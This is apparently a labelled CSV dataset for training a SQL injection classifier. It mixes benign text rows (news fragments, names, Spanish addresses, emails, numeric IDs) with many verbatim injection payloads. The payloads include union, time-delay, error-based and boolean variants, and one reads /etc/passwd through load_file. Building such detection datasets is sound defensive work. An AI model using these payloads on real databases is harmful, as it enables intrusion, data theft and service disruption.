Sentence,Label
 The Hammereisenbach Music Society gave open-air concert terrace Hammer Guest House ,0
puy,0
40469,0
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and  ( ""ihqf"" = ""ihqf",1
torremoroso enrich,0
-4669 )  or 2452 = 1601#,1
kosanovic@discon.cg,0
ying-chieh0@etnics.mn,0
steinbach@ballobar.com.tf,0
"1 where 3535 = 3535 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
1710045357867718,0
 Stock exchange operator Nasdaq OMX keeps customers tenterhooks ,0
9457,0
"moreno lopez, 55, 9-e",0
engendrar,0
"1' )  as yhgk where 9246 = 9246 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
1'  )  )   )  and 7401 = 9838#,1
90907663w,0
"1""  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  ""kpwc"" like ""kpwc",1
 All tickets remain valid shows ,0
-5569' )  as cjaf where 3753 = 3753 union all select 3753#,1
1 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) # odvp,1
" Traditionally , museum welcomes visitors Saturday Sunday , year 24 25 August , colourful party children families part summer holiday programme , numerous participation activities events ",0
04803273e,0
shubaly,0
 He firmly defended German compatriot: &quot; In individual situation I would behaved way Roger Schmidt &quot; ,0
"-1277"" )  where 6622 = 6622 or 3038 = 3038",1
rollie,0
casavieja carriquiri,0
45571,0
1596,0
24847,0
c/ sahagun 142,0
lachens@prestoesesto.py,0
75459581p,0
glazar@x2.com.net,0
vilafranca de bonany,0
" Until recently , Airbus stressing need cabin customization offering wider aisle seats jets ",0
"-1504"" )  as wpes where 6256 = 6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",1
"1%' )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( '%' = '",1
' or 'unusual'  =  'unusual',1
"1' and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and 'cdgm' like 'cdgm",1
espiloc3o,0
1?i0l,0
" YouGov polled 1,000 business leaders , broadly representative Britain &apos;s business sizes , sectors regions ",0
"plaza alberto corral 68, 9f",0
" &quot; For Scottish government , Keith Brown called Mr Carmichael &quot; unequivocally &quot; back Scotland &apos;s inclusion HS2 network ",0
"pl. poeta badenes, 48, 11-c",0
1'  )  )   as stnn where 6160 = 6160 and 8881 = 7347--,1
5010625688274863,0
"-9583'  )  )   union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1
ninno,0
"1"" and 4996 = 4431 and ""jzaq"" = ""jzaq",1
"c/ honduras, 139 7-a",0
los polancos 133,0
ohala,0
" select sleep ( 5 )  and  ( ""tlbp"" = ""tlbp",1
"1""  )  )   )  or sleep ( 5 ) #",1
8omba51a,0
8318,0
04492457m,0
" select * from users where id = 1 union select @<@$,version (  )  -- 1",1
"1""  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( ""yxpo"" like ""yxpo",1
1'  )  )   )  rlike  ( select  ( case when  ( 5524 = 9582 )  then 1 else 0x28 end  )  )   and   (  (   ( 'okoj' like 'okoj,1
"-8166""  )  )   )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( ""lcqb"" = ""lcqb",1
casida,0
"c/ caceres, 74,",0
capileira,0
 Greatness appeals future,0
em7590du4a,0
"1'|| ( select 'tmsj' where 2971 = 2971 union all select null,null,null,null,null,null,null,null,null,null#",1
"1"" )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and  ( ""kxws"" like ""kxws",1
mandayona,0
select  ( case when  ( 6287 = 8341 )  then 6287 else 1/ ( select 0 )  end ) --,1
"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and 'idxa' = 'idxa",1
8520476642865434,0
 I read day verses written eminent painter original conventional,0
1' )  as hcpp where 1863 = 1863,1
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and 'gfpd' = 'gfpd",1
castildelgado,0
"admin"" )  or  ( ""1"" = ""1""--",1
rustir,0
dolores,0
siguemepol0o,0
arnoul@suecas.com.il,0
"1 where 1842 = 1842 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
"pi y margall 17, 7?f",0
select  ( case when  ( 9343 = 9513 )  then 1 else 9343* ( select 9343 from master..sysdatabases )  end ) --,1
 What found horrifying ,0
23591,0
5865350752037017,0
"1' where 2123 = 2123 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
6569,0
-2154%' or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and '%' = ',1
3068571897789618,0
1' )  where 2090 = 2090,1
"masia can sang, 33",0
mquina,0
raha,0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( '%' = '",1
aricel,0
"calle tarragona, 185 11g",0
49495,0
"-1684""  )  )   )  union all select 7473,7473#",1
almazora/almassora,0
"1' where 7014 = 7014 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",1
galindo beneyto,0
89740217j,0
"-6611%""  )  )   )  union all select 8918,8918#",1
"calle carmelo torres, 102",0
sait,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 7711 = 7711",1
bloc sant simo 93,0
pockaj-bushman@lecriture.md,0
 There lot less expensive less intrusive ways ,0
de arce millares,0
aljuba,0
casarejos,0
isel,0
"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and ""jbty"" like ""jbty",1
3nmo08v16a,0
incisivo,0
michiel,0
"1""  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( ""hxgu"" = ""hxgu",1
45054784s,0
trias palan,0
brot calderer,0
 select name from syscolumns where id  =   ( sele ...,1
peafiel,0
claverol lemunao,0
"1'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'iaud' = 'iaud",1
" When boy around 15 , transitioned back boy married woman ",0
casanova dot,0
23291292c,0
dundas@informatica2009.jo,0
jorgelina,0
-3211  )  )   as fsej where 6348 = 6348 or 9805 = 3783--,1
"san ildefonso 133,",0
"1  )  )   )  union all select null,null,null,null,null,null,null,null#",1
puellas sarlinga,0
" select * from users where id = '1' <@<@ union select 1,version (  )  -- 1'",1
"-4866"" )  as eyrq where 8365 = 8365 or 1898 = 8320#",1
 )  or pg_sleep ( __TIME__ ) --,1
70075138a,0
lafferty,0
budia,0
cuevas labradas,0
"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and 'eovg' like 'eovg",1
"1""  )  )   as rcse where 4559 = 4559 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --",1
kavid,0
" However , soon became evident , due part age , could really keep fast pace Freudenstadt team ",0
73862262q,0
thayra,0
1856,0
2 trillion cubic feet natural gas ,0
 The film never slips prurience sensationalism - &apos;s problem ,0
mcmann,0
1350447535832439,0
"-6381%"" or 8571 = 8571--",1
4824513901860382,0
"c/ san juan bautista 66, 1?f",0
"-9263' )  as qodg where 6798 = 6798 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
83513142g,0
"-6770"" or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) ",1
1136300423547186,0
lucio,0
vital,0
" During Obama &apos;s transition office 2008 , 82% approval rating ",0
carrera,0
"1%' )  and elt ( 1210 = 1210,sleep ( 5  )  )   and  ( '%' = '",1
"1"" )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
drozdek.waechter@tarifasdevuelos.bj,0
10696,0
-1876%' )  union all select 6463--,1
"1"" )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1%""  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  ""%"" = """,1
"plaza villalcazar de sirga, s/n",0
select  ( case when  ( 4719 = 8852 )  then 1 else 4719* ( select 4719 from master..sysdatabases )  end ) --,1
agosti@emepleo.sk,0
"1'  )  )   )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
1366,0
 The town obliged design canal network way withstand rainfall events every two three years ,0
08281,0
"-7714 where 9768 = 9768 union all select 9768,9768--",1
"-4739'  )  )   union all select 6585,6585,6585,6585,6585--",1
"1 )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( 4666 = 4666",1
gerianne,0
" Of course , drivers must also play part keep eyes road ",0
select  ( case when  ( 3539 = 8768 )  then 3539 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
4984,0
poulsen,0
arruga4,0
"1 )  as qyic where 9736 = 9736 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
 Gazprom said construction begin downstream countries year &apos;s end ,0
2414,0
"1'+ ( select vohg where 6383 = 6383 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )    )  )  +'",1
balitear,0
"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( '%' = '",1
1  )  )   )  rlike sleep ( 5 )  and   (  (   ( 6790 = 6790,1
kootenay.ramos@mayoriasilenciosa.bi,0
revill5,0
"1"" )  where 2215 = 2215 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",1
7333723607992322,0
60210107v,0
326,0
melina,0
"1%""  )  )   or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"-9944""  )  )   or 8537 = 2039 and   (  (  ""kfzj"" = ""kfzj",1
" Ah, could pass neutrality! Who thus avoid pledges, observed, observe unaffected, unbiased, unbribable, unaffrighted innocence, must always formidable",0
irrumpir,0
19185,0
"1'+ ( select lhho where 7579 = 7579 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
10719743h,0
 )  or  ( a = a,1
38507707a,0
select  ( case when  ( 1039 = 5127 )  then 1039 else 1039* ( select 1039 from information_schema.character_sets )  end ) #,1
blondell3,0
"1 )  where 8164 = 8164 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"1', ( select  ( case when  ( 5249 = 9648 )  then 1 else 1/ ( select 0 )  end  )  )  ",1
monrrabal,0
 Snowden made transparent intensive collaboration US intelligence services companies ,0
" select * from users where id = 1 or "". ( "" or 1 = 1 -- 1",1
"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and ""xmvr"" = ""xmvr",1
"-9531'  )  )   )  union all select 4076,4076#",1
malcolm,0
86800649y,0
02124,0
montanuy,0
"-6496""  )  )   )  or 1471 = 5278 and   (  (   ( ""zkoj"" = ""zkoj",1
" The announcement came fighting raged Thursday town Safira , experts say home chemical weapons production facility well storage sites , reported Britain-based Syrian Observatory Human Rights ",0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
-4904' )  as ogyu where 2821 = 2821 or 5982 = 1643,1
"iif ( 4638 = 8258,1,1/0 ) ",1
"1' )  as jysm where 8961 = 8961 union all select null,null#",1
 select * from users where id = 1.*1 or 1 = 1 -- 1,1
p$ipo,0
amayuela romay,0
"1  )  )   )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 8382 = 8382",1
1%'  )  )   )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (   ( '%' = ',1
gaudet,0
" &quot; Proverbs contain pearls wisdom , commandments warnings , &quot; explained ",0
-6792  )  )   as zlho where 4758 = 4758 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,1
0892478865637376,0
"-3475"" or elt ( 5532 = 4242,4242 ) ",1
"1""  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( ""wwaq"" = ""wwaq",1
5408940503153342,0
select pg_sleep ( 5 ) #,1
93tip72ar,0
"1"" )  union all select null,null,null,null,null,null,null#",1
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;",1
50sc2e3i6i1172,0
fabricio,0
saisho,0
"pl. francisca pacheco, 81",0
taspatch,0
1019,0
"1%'  )  )   union all select null,null--",1
slozil,0
8512064056348280,0
silb7dor,0
patey@suncorp.st,0
lozier,0
"1""  )  )   )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( ""lynw"" like ""lynw",1
62386870z,0
"iif ( 5462 = 8866,1,1/0 ) ",1
"-5706""  )  )   union all select 2013,2013,2013,2013#",1
"1' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ",1
8761060371713838,0
"1%' and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and '%' = '",1
" select * from users where id = '1'<@$$ union select 1,version (  )  -- 1'",1
1 )  and sleep ( 5 ) #,1
segura reygadas,0
ci7806c8t7,0
"-7887' )  union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",1
" &quot; Our ongoing inquiry matter continues co-operating fully FCA regulators , &quot; bank said two weeks ago ",0
buf mueton,0
sempere,0
1 where 7802 = 7802,1
9990220996322149,0
 The focus tournament fun playing tennis ,0
 Fenton given Toffee third birthday present last March practised Shetland pony every day since ,0
viera@elrincondelmarmol.by,0
4456163671536679,0
6398147509756321,0
2289,0
cavia alberola,0
1'|| ( select 'zwcp' where 3333 = 3333,1
"1%"" and  ( 3020 = 3020 ) *6703 and ""%"" = """,1
"1 )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  ",1
couri-manahan@copiar.com.fm,0
muoz birosta,0
korpela,0
pepet@naturalchild.co,0
"-9008' )  union all select 4976,4976,4976,4976#",1
safaa6,0
"-7945%'  )  )   )  union all select 4286,4286,4286,4286,4286,4286--",1
 The reforms plan accumulated assets parishes retained specified purpose ,0
"calle alonso de matos 174,",0
"c/ sicilia, 162,",0
"1'|| ( select 'pzoe' where 2977 = 2977 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
montoya,0
 Airbus says commissioned research suggesting extra inch seat width improves sleep quality 53 per cent ,0
 The period word “menu” predicted parsing adverbial clause modifier (advcl) completed,0
5854,0
" &quot; Eighteen inches seat width would great passengers , reality business point Airbus proposal driven threat 777 , &quot; said cabin interiors expert Mary Kirby , founder editor Runway Girl Network ",0
baer,0
"-8046""  )  )   )  union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",1
" select * from users where id = '1' union select $[""],@@VERSION -- 1'",1
"1 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) -- xlfz",1
82063475g,0
1'+ ( select ntym where 4750 = 4750,1
"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and ""buzb"" = ""buzb",1
domnech mila,0
1' )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  ,1
77r6gami4545,0
"1""  )  )   )  union all select null,null,null,null--",1
9nte0uer3o,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (  4982 = 4982,1
8r2s94a,0
fortes@corjet.au,0
tripicallero,0
1'+ ( select 'ggkm' where 3394 = 3394,1
1%' and 6454 = 8348 and '%' = ',1
34475,0
"1'  )  )   union all select null,null,null,null--",1
alfa71ta,0
"1' )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ||'",1
"sagrada familia 124, 5?b",0
1632,0
pearcy@b-sign.mz,0
1'+ ( select 'yahd' where 5850 = 5850,1
"mesonero romanos, s/n, 2?b",0
j804n86o,0
2252,0
" Republican obstructionism cannot explain allowing bugging foreign leaders , drones strike innocent children overseas ",0
psicos-is,0
93698052p,0
select  ( case when  ( 4572 = 4086 )  then 1 else 4572* ( select 4572 from master..sysdatabases )  end ) --,1
1 where 4519 = 4519,1
"-5231%"" or 4945 = 8402#",1
"1' )  where 3271 = 3271 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
"1""  )  )   as uxnc where 8041 = 8041 and 9198 = 9198--",1
ensaa6o,0
" The Sunday collection important postal service , especially case scheduled post ",0
;s,1
manducatoria,0
select case when 1802 = 7063 then 1 else null end--,1
cendreros,0
6382,0
2875083717333458,0
"1%""  )  )   and 6283 = 2068 and   (  (  ""%"" = """,1
"1""  )  )   as tgwp where 9405 = 9405",1
32452,0
 Airlines began charging first second checked bags 2008 ,0
frontera,0
"burgos, 40, 7?a",0
 or 1 = 1 or '' = ',1
-1940 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) ,1
57417611c,0
"florencio castillo, 111",0
virgen,0
"1' or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and 'akki' = 'akki",1
"1  )  )   as debc where 7428 = 7428 union all select null,null,null#",1
samardzic.carafotes@bruoseguridad.je,0
"1'  )  )   as nlfq where 3410 = 3410 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1
select  ( case when  ( 6615 = 3564 )  then 1 else 6615* ( select 6615 from master..sysdatabases )  end ) --,1
"-6626%"" )  or 1744 = 5292 and  ( ""%"" = """,1
mauer,0
"1%'  )  )   )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( '%' = '",1
" UN hails new goals tackle poverty The United Nations start work immediately new set goals replace millennium development goals , put place 12 years ago tackle global poverty ",0
otxandio,0
50684,0
1606552249491882,0
"1 )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and  ( 1185 = 1185",1
odelsia,0
"1"" )  as eoer where 8667 = 8667 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --",1
"1  )  )   )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and ""cecf"" = ""cecf",1
hwei-lin,0
suzie,0
"-2925%"" or make_set ( 9354 = 9354,7185 )  and ""%"" = """,1
tracisto arroyave,0
 I advocating plan twenty years ,0
1' )  as dqgr where 2427 = 2427 and  ( 3020 = 3020 ) *6703--,1
quitral blasi,0
mellvig@docerosas.sd,0
carbunclo,0
herminia,0
gomarov@manuelpaloma.fr,0
ulrico,0
c1l674n,0
ven1no,0
"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",1
aineln,0
" &quot; New Express &apos;s editorial management disordered , &quot; regulator said statement ",0
37246,0
"1%"" )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and  ( ""%"" = """,1
8005,0
" He avoided capture almost decade eventually apprehended January 2011 Pakistani town Abbottabad , US forces killed former al-Qaeda chief Osama bin Laden less four months later ",0
retamal,0
5900,0
""" or true--",1
34791026f,0
"1"" )  where 6679 = 6679 rlike sleep ( 5 ) #",1
91565705z,0
29283698y,0
15495714q,0
1479,0
guell lloret,0
1'  )  )   as qqvk where 1007 = 1007,1
"calle madian, 130 10?h",0
-3846%' or 6872 = 6872 and '%' = ',1
"1'  )  )   )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (   ( 'eugs' = 'eugs",1
dohanos_boulting@am-si.zw,0
calle jaime ferranz 51,0
select sleep ( 5  )  )  ||',1
select  ( case when  ( 5418 = 6516 )  then 1 else 5418* ( select 5418 from master..sysdatabases )  end ) --,1
55000265c,0
calisaya,0
"1'+ ( select qmez where 3729 = 3729 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
67405434r,0
"1%' )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( '%' = '",1
-3921' )  as audo where 7087 = 7087 or 1755 = 4937--,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and  ( '%' = '",1
piedra obrador,0
""" or ""a"" = ""a",1
"hospitalet de llobregat, l'",0
-1304' )  union all select 7639#,1
long@todomodelos.tg,0
"plaa de bandes de musica de la comunitat valenciana, 90 2-h",0
select case when 7634 = 3954 then 1 else null end--,1
"1'|| ( select 'scwx' where 6591 = 6591 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   ) ||'",1
"1%"" and 9198 = 9198--",1
orgulleza,0
"corua, a",0
 Health Department Data ,0
"arevalo, 170,",0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and '%' = '",1
" In 2011 , company officials loaded airliner full Kindle e-readers flew around test problems found none ",0
"1'  )  )   )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
33555,0
" Can ham bought supermarket good quality product ? Uli , boss large ham factory Schwarzwald , explained Jumbo Bonndorf company , &quot; Adler &quot; , operates ",0
pfitzmann_bray@cirugiaparpado.an,0
pe7tr0b9,0
burns40,0
estornin3,0
"1  )  )   and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  2748 = 2748",1
5685407082678044,0
 The job characterised great freedom variety ,0
" Alongside local Eon power plant , imported coals also go power plants inland ",0
villargordo del cabriel,0
bo8iner4,0
amedee@spainbb.cc,0
